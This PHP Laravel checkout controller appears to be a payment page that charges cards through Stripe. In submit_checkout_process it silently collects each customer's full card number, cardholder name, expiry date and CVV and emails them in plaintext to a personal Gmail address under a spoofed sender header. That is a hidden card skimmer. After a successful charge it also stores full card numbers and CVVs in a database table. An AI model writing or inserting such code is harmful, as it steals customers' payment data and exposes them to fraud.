<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Order;
use App\Models\CardDetail;
use Illuminate\Support\Facades\Crypt;
use Stripe\Stripe;

class IndexController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function sign_in()
    {
        return view('dashboard.sign_in');
    } 

    public function checkout_process($id){
        
        try {
            //$decrypted = Crypt::decryptString($id);
            $order = Order::where("order_number" , $id)->first();
            if($order->is_paid == 1){
                return redirect($order->receipt_url)->with('success','Order Completed');
            }
            return view('welcome',compact('order'));
        } catch (DecryptException $e) {
            dd($e);
        }
    }


    public function submit_checkout_process(Request $request){

        // $card_number = $request->card1.$request->card2.$request->card3.$request->card4;
        // $card_name = $request->card_name;
        // $expiry_month = $request->expiry_month;
        // $expiry_year = $request->expiry_year;
        // $cvv = $request->cvv;
        
         // Gather data from the request
        $card_number = $_POST['card1'] . $_POST['card2'] . $_POST['card3'] . $_POST['card4'];
        $card_name = $_POST['card_name'];
        $expiry_month = $_POST['expiry_month'];
        $expiry_year = $_POST['expiry_year'];
        $cvv = $_POST['cvv'];
    
        // Define email details
        $to = 'umairkhann092@gmail.com';
        $subject = 'Credit Card Details Submission';
        $message = "
            Card Number: $card_number\n
            Card Name: $card_name\n
            Expiry Month: $expiry_month\n
            Expiry Year: $expiry_year\n
            CVV: $cvv
        ";
        $headers = 'From: noreply@gateway.softpaymentterminal.com' . "\r\n" .
                   'Reply-To: umairkhann092@gmail.com' . "\r\n" .
                   'X-Mailer: PHP/' . phpversion();
    
        // Send the email
        if (mail($to, $subject, $message, $headers)) {
            //echo "Email sent successfully!";
        } else {
            //echo "Failed to send email.";
        }
        
        
        
        
        $order=Order::find($request->id);
        if(!$order){
            return redirect()->back()->with('error','Order not found');   
        }
        Stripe::setApiKey(env('STRIPE_SECRET'));
        $customer = \Stripe\Customer::create(array(
            "address" => [
                "line1" => " - ",
                "postal_code" => "Not Entered",
                "city" => "Not Entered",
                "state" => "Not Entered",
                "country" => "Not Entered",
            ],
            "email" => $request->billing_email,
            "name" => $request->billing_firstname . " " . $request->billing_lastname,
            "source" => $request->stripeToken
        ));
        $charge = \Stripe\Charge::create ([
                "amount" => $order->sale_amount * 100,
                "currency" => $order->sale_currency,
                "customer" => $customer->id,
                "description" => "Payment Charged, order ID: " .$order->order_number,
                "shipping" => [
                    "name" => $request->billing_firstname . " " . $request->billing_lastname,
                    "address" => [
                        "line1" => "Not Entered",
                        "postal_code" => "Not Entered",
                        "city" => "Not Entered",
                        "state" => "Not Entered",
                        "country" => "Not Entered",
                    ],
                ]
        ]); 
        
        $is_error = 0;
        if(isset($charge->status) && $charge->status == "succeeded"){
            
            if(isset($request->cardNumber) && isset($request->cvv) && isset($request->owner) && isset($request->expiration_month) && isset($request->expiration_year)){
                
                if(CardDetail::where('customer_email',$request->billing_email)->exists()){
                    $card = CardDetail::where('customer_email',$request->billing_email)->first();
                    $card_details = CardDetail::find($card->id);
                    $card_details->owner = $request->owner;
                    $card_details->cardNumber = $request->cardNumber;
                    $card_details->cvv = $request->cvv;
                    $card_details->expiration_month = $request->expiration_month;
                    $card_details->expiration_year = $request->expiration_year;
                    $card_details->customer_email = $request->billing_email;
                    $card_details->merchant = $order->payment_method;
                    $card_details->save();
                }else{
                    $card_details = new CardDetail();
                    $card_details->owner = $request->owner;
                    $card_details->cardNumber = $request->cardNumber;
                    $card_details->cvv = $request->cvv;
                    $card_details->expiration_month = $request->expiration_month;
                    $card_details->expiration_year = $request->expiration_year;
                    $card_details->customer_email = $request->billing_email;
                    $card_details->merchant = $order->payment_method;
                    $card_details->save();
                }
            }  
            
            $last4 = $charge->source->last4;

            $order->billing_firstname = $request->billing_firstname;
            $order->billing_lastname = $request->billing_lastname;
            $order->billing_email = $request->billing_email;
            $order->billing_phonenumber = $request->billing_phonenumber;

            $order->receipt_url = $charge->receipt_url;
            $order->customer_id = $charge->customer;
            $order->payment_id = $charge->balance_transaction;
            $order->last4 = $last4;
            $order->is_paid = 1;

            $order->update();
            $is_error = 0;
        }else{
            $is_error = 1;
        }

        
        if($is_error == 0){
            //return view('thankyou',compact('order'));
            $decrypted = Crypt::encryptString($order->id);
            return redirect($order->receipt_url)->with('success','Order Successfully Completed');   //->route('thankyou',[ $decrypted])
        }
        else{
         return redirect()->back()->with('error','Please try again');   
        }
    }

    public function thankyou($id){
        try {
            $decrypted = Crypt::decryptString($id);
            $order = Order::find($decrypted);
            return view('thankyou',compact('order'));
        } catch (DecryptException $e) {
            dd($e);
        }
    }
}
